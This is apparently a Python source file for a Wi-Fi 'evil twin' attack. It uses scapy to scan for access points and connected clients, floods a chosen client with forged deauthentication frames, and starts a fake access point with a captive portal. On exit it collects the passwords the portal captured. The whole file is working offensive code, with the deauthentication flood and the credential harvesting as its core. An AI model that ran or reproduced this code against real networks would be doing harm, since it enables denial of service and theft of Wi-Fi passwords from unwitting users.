import string
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
import CreateFakeAP as cf
import MonitorMode as mm
import os
import threading

ap_list = []
ssid_list = []
channel_list = []
client_list = []
user_interface = ""
ap_to_attack = ""
channel = 1
stop_change = False
stop = False


def network_scanning():
    global stop_change
    print("START scanning for access points for a minute")
    print("To stop before timeout -> press CTRL+C\n")
    print("INDEX           MAC              SSID                       CHANNEL")
    """ 
    We will give the interface name as parameter,
    so that we get only packets that are relevant to us,
    in addition on each of the packets we will run the function AP_filter
    """
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    sniff(iface=user_interface, prn=AP_filter)  # , timeout=60)

    stop_change = True


def AP_filter(packet):
    global ap_list
    """
    this function check if the packets from type 802.11, if so,
    she check if this is beacon frame and than append the AP to
    the list and save her mac address
    Dot11 - it's shorthand for the 802.11
    type = 0 - to indicate the frame is a management frame (type 0)
    subtype = 8 to indicate the management frames subtype is a beacon (type 8)
    """
    # if the packet type 802.11
    if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
        if packet.addr2 not in ap_list:
            ap_list.append(packet.addr2)  # addr2 - source mac address of sender
            ssid_list.append(packet.info.decode("utf-8"))  # ssid
            channel_list.append(packet.channel)
            print(" ", len(ap_list),
                  '      %s     %s                      %s     ' % (
                      packet.addr2, packet.info.decode("utf-8"), packet.channel))


def change_channel():
    global channel
    ch = 1

    while True:
        os.system(f"iwconfig {user_interface} channel {channel}")
        # switch channel from 1 to 14 each 0.5s
        channel = channel % 14 + 1
        time.sleep(0.5)
        if stop_change:
            break


def users_scanning():
    print("\nSTART scanning for connected clients ..")
    print("To stop -> press CTRL+C\n")
    print("INDEX            CLIENT MAC")
    """ 
    We will give the interface name as parameter,
    so that we get only packets that are relevant to us,
    in addition on each of the packets we will run the function users_filter
    """
    sniff(iface=user_interface, prn=users_filter)


def users_filter(packet):
    global client_list
    """
    this function checks whether the frame was not sent from ds, if so, it checks if it was sent to
    the AP we want ta attack.
    if the mac assresses equals, it will append the client into a list who saves all the clients.
    addr1= ap_mac
    addr2= client_mac (frame sender)
    """

    if packet.FCfield:
        DS = packet.FCfield & 0x3
        to_ds = DS & 0x1 != 0
        from_ds = DS & 0x2 != 0

        if to_ds and not from_ds:
            if packet.addr1 == ap_to_attack and packet.addr2 not in client_list:
                client_list.append(packet.addr2)
                print(" ", len(client_list), "          ", packet.addr2)


def to_AP(sender, reciver, iface):
    """
    this function create fake Deauthentication packets from AP to client and send them.
    toDS = 1, fromDS = 0
    addr1- BSSID (AP)
    addr2- Source (client)
    addr3- Dest (AP)
    """
    try:
        dot11 = Dot11(type=0, subtype=12, addr1=reciver, addr2=sender, addr3=reciver)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)  # create attack frame
        sendp(packet, inter=0.1, count=100, iface=iface, verbose=0)
    except:
        pass


def to_client(sender, reciver, iface):
    """
    this function create fake Deauthentication packets from client to AP and send them.
    toDS = 0, fromDS = 1
    addr1- Dest (client)
    addr2- Source (AP)
    addr3- BSSID (AP)
    """
    try:
        dot11 = Dot11(type=0, subtype=12, addr1=reciver, addr2=sender, addr3=sender)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)  # create attack frame
        sendp(packet, inter=0.1, count=100, iface=iface, verbose=0)
    except:
        pass


def disconnect(target_mac, ap_attack_mac, interface_name):
    """
    this function send the fake packets in infinity loop.
    target_mac- user mac
    ap_attack_mac - network mac
    interface_name - the bad network
    --------
    dot11- to create 802.11 frame
    type = 0 , subtype=12 - Deauthentication packet
    addr1- destination MAC
    addr2- source MAC
    addr3- AP MAC
    """
    global stop
    while True:
        to_client(target_mac, ap_attack_mac, interface_name)  # ap to client
        to_AP(ap_attack_mac, target_mac, interface_name)  # client to ap
        if stop:
            break


def restart(interface):
    """
    this function doing reset to the setting we were set.
    """

    # kill all dnsmasq process
    # Delete the configuration files

    os.system('service NetworkManager start')
    os.system('service apache2 stop >/dev/null 2>&1')
    os.system('service hostapd stop >/dev/null 2>&1')
    os.system('service dnsmasq stop >/dev/null 2>&1')
    os.system("killall dnsmasq >/dev/null 2>&1")
    os.system("killall hostapd >/dev/null 2>&1")
    os.system('iptables -F')
    os.system('iptables -t nat -F')
    os.system("sudo rm hostapd.conf dnsmasq.conf")
    os.system("sudo systemctl unmask systemd-resolved >/dev/null 2>&1")
    os.system("sudo systemctl enable systemd-resolved >/dev/null 2>&1")
    os.system("sudo systemctl start systemd-resolved >/dev/null 2>&1")
    os.system("sudo rm /etc/resolv.conf")
    os.system("sudo ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf")
    mm.Stop_Monitor_Mode(interface)


def main_attack():
    global user_interface, ap_to_attack, stop, channel
    os.system('service NetworkManager stop')
    user_interface = input("please enter the interface name you want to sniff on: ")
    fake_ap_interface = input("please enter the interface name you want for your fake AP: ")

    # ----------- STEP 1 - change to monitor mode -----------
    mm.Change_to_Monitor_Mode(user_interface)

    # -------------- START evil twin attack --------------
    # ----------- STEP 2 - WLAN scanning -----------
    network_scanning()

    # ----------- STEP 3 - Choose AP to attack -----------
    if len(ap_list) > 0:
        print("\n")
        index = int(input("Please enter the index of the SSID that you want to attack: ")) - 1
        channel = channel_list[index]
        print("YOU CHOSE ->  ", ssid_list[index])

        # change the interface channel
        os.system("iwconfig " + user_interface + " channel " + str(channel))

        # save the Attacked AP details
        ap_to_attack = ap_list[index]
        ssid_to_attack = ssid_list[index]

        # ----------- STEP 4 - Users scanning -----------
        users_scanning()

        # ----------- STEP 5 - Choose client to attack -----------
        if len(client_list) > 0:
            index = int(input("\nPlease enter the index of the client MAC that you want to attack: ")) - 1
            print(f'YOU CHOSE ->  {client_list[index]}')
            user_mac = client_list[index]

            # ----------- STEP 6 + 7 - Create CaptivePortal && AP ------------
            # we need to create two conf files -> dnsmasq.conf, hostapd.conf, set up
            # the settings in iptables and start the appache server.

            cf.set_settings(fake_ap_interface, ssid_to_attack, channel)

            # ----------- STEP 8 - Disconnect the user from AP -----------
            # we will send deauthentication notification to the client and to ap.
            # it will keep sending as the program is running.

            print("\nStart deauthentication attack..")
            disconnect_thread = threading.Thread(target=disconnect, args=(user_mac, ap_to_attack, user_interface),
                                                 daemon=True)
            disconnect_thread.start()
            time.sleep(3)

            # # ----------- STEP 9 - Clean and Exit the program -----------
            empty = input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
            stop = True

            os.system('cat /var/www/html/passwords.txt >> Captivportal/passwords.txt')
            time.sleep(5)
            restart(user_interface)  # reset all the settings
            os.system("clear")
            time.sleep(2)
            sys.exit()

        else:
            print("There is not connected client to attack")
            os.system('service NetworkManager start')

    else:
        print("There is not available AP to attack")
        os.system('service NetworkManager start')


if __name__ == '__main__':
    main_attack()
    print("bye")
    time.sleep(2)
